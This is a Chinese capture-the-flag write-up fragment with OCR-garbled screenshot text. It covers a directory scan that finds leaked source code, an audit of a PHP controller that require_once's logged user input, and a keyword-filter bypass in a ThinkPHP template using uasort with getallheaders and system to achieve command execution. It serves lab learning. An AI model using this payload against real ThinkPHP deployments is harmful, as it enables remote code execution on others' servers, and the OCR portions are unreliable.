+<!-- 这是一张图片，ocr 内容为：[03:41:51] 279B /APP/ETC/FPC.XML 403 /APP/ETC/LOCAL.XML.LIVE 403 [03:41:51] USBMICEDA.. 279B USBKEYBOA 279B [03:41:51] 403 /APP/ETC/LOCAL.XML [03:41:51] 403 279B /APP/ETC/LOCAL.XML.BAK /APP/ETC/LOCAL.XML.VMACHINE.RM [03:41:51] 279B 403 403 [03:41:51] 279B /APP/ETC/LOCAL.XML.PHPUNIT /APP/ETC/LOCAL.XML.TEMPLATE 279B 403 [03:41:51] 279B 403 [03:41:51] /APP/LANGUAGES WORDLISTS 279B [03:41:51] / APP/KIBANA/ 403 403 03:41:51 /APP/LOGS/ 279B /APP/ETC/LOCAL.XML.VMACHINE 279B 403 [03:41:51] [03:41:51] 403 279B /APP/PHPUNIT.XML [03:41:51] 403 279B /APP/STORAGE/ 403 279B /APP/TOG/ 279B 403 [03:41:51] /APP/SRC /APP/UNSCHEDULE.BATS-SHA...  P12CRACKER... 403 [03:41:51] 279B [03:41:51] 279B 403 /APP/SYS 403 /APP/TESTING 03:41:51 279B 279B 403 [03:41:51] /APP/VENDOR- 403 [03:41:51] 279B /APP/VENDOR-SRC [03:41:51] 279B 403 /APP/VENDOR 403 279B [03:41:51] JWT_TOOL-2.2.7 APP/TMP/ SERVER ROCKYOU.TXT 1KB 200 [03:41:54] COMPOSER.JSON 37KB 200 [03:41:54] COMPOSER.LOCK HTTP://GZ.IMXBT.CN:20997/CONFIG/ /CONFIG 301 [03:41:54] 320B /CONFIG/ [03:41:54 403 279B /CONFIG/APP.PHP [03:41:54] 166B 200 1KB /LICENSE.TXT [03:42:03] 200 HTTP://GZ.IMXBT.CN:20997/PUBLIC/ /PUBLIC 320B 301 [03:42 /PUBLIC/ 500 7KB 03:41 README.MD 1KB [03:42:12 200 [03:42:13] 279B /SERVER-STATUS/ 403 SQU TER Y [03:42:13] DECOME,THEM 279B /SERVER-STATUS 403 /VENDOR/ [03:42:19] 279B 403  /VENDOR/COMPOSER/AUTOLOAD_ FILES.PHP [03:42:19] 0B 200 SHELL /VENDOR/COMPOSER/AUTOLOAD. 0B CLASSMAP.PHP [03:42:19] 200 /VENDOR/COMPOSER/AUTOLOAD_PSR4.PHP [03:42:19] 0B 200 [03:42:19] /VENDOR/COMPOSER/AUTOLOAD. 200 0B _NAMESPACES.PHP [03:42:19] /VENDOR/AUTOLOAD.PHP 0B 200 0B VENDOR/COMPOSER/AUTOLOAD_REAL.PHP [03:42:19] 200 [03:42:19] 0B /VENDOR/COMPOSER/CLASSLOADER.PHP 200 /VENDOR/COMPOSER/AUTOLOAD_STATIC.PHP [03:42:19] 0B 200 1KB /VENDOR/COMPOSER/LICENSE [03:42:19] 200 39KB 200 [03:42:19] VENDOR/COMPOSER/INSTALLED.JSON 796KB 200 [03:42:22] /WWW.Z1P -->
+![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1732697006821-cadba462-6b32-4507-a266-28d7038d3d50.png)
+
+发现源码泄露，对代码进行审计
+
+<!-- 这是一张图片，ocr 内容为：<?PHP NAMESPACE APP\CONTXOLLEX; USE APP\BASECONTROLLER; EXTENDS BA3ECONTROLLEX FANATION INDEX( ) PUBLIC SCODE - PREG_REPLACE(M/(\*;4111111/",-11, S_POST['CODE');Y); /TMP/ATTACK.1OG';9 IF(FILE EXISTS(SATTACK LOG FILE)) (L FILC PAT CONTENTS(SETTACK LOG FLLE, ISATTAOK WORD'('''''''''''''''."'."."'ZLA",EITE APEEHD); REQUIRE ONCE('/TMP/ATTACK.LOG'); ELSE IS FILE PUT CONTENTS(SATTACK LOG FILE, (''.1?'.'PHP'.W\\N"); IR(ISSET(SATTACK WORD))( '检测到危险代码:'.SATTACK WORD.!!!!! ELSE 欢迎使用GXNGXNGXN的恶意代码检测器!!! LELSELR SAAFE LOG FILE S T/TMP/SAFE,LOG'I IF(FILE EXISTS($SAFE LOG FILE)) (I  APPEND): FILE PUT CONTENTS(SGARE LOG RLLE, 'SSARE WORD-N'.SCODE,'N;'"' REQUIRE ONCE(TMP/SAFE.LOG'): ELSCIS FILE PUT CONTENTS(SSAFE LOG EILE, '`"."?''.'PHP',W\IN"); ISSER,未检测到危险代码,I.SSATE.WORD.',非常安全'; 567880 ELSELT ECHO.欢迎使用GXNGXNGXN的恶意代码检测器!!! -->
+![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1732697412734-84beaa2e-5dfc-4dac-89b3-e42e49a07a9a.png)
+
+发现只是单纯 replace 了一些字符，然后进行了 require_once 日志
+
+无论是否被检测，都会执行 require_once 执行代码
+
+
+
+thinkphp ${   } 模板 可以执行命令
+
+使用 
+
+```plain
+${system}
+>> 检测到危险代码: ${system}！！！
+
+${1}
+>> <title>系统发生错误</title>
+```
+
+说明需要绕过 WAF 就可以进行命令执行，那么需要绕过进行命令执行，uasort() 可以命令执行，那么构造
+
+```plain
+${uasort(array,myfunction)}
+array = getallheaders
+myfunction = system
+```
+
+<!-- 这是一张图片，ocr 内容为：LZSDS{7BCCBEFA-B037-4FF6-BD32-22ADE0166C0B} 页面错误!请稍后再试~ THINKPHPV6.0.9{十年磨一为AP1开发设计的高性能框架了-官方手册 应用程序 调试器 查看器 无障碍环境 日存储 性能习存 网络 日控制台 MAX HACKBAR HACKBAR 样式编辑器 SQL+ XSS LFI                                                                                          ENCRYPTION ENCODING LOAD URL HTTP://GZ IMXBT.CN:20007/PUBLIC/INDEX.PHP SPLIT URL EXECUTE COOKIES OREFERER USER AGENT POST DATA CLEAR ALL ADD IT CAT/F CODE$11 -->
+![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1732701664399-f1ddeaee-42bc-4e48-8412-7724adacb91a.png)
+
+##  海关检测
+无法复现
+
+当代码无法找出漏洞的时候，应该怀疑是否是中间件问题
+
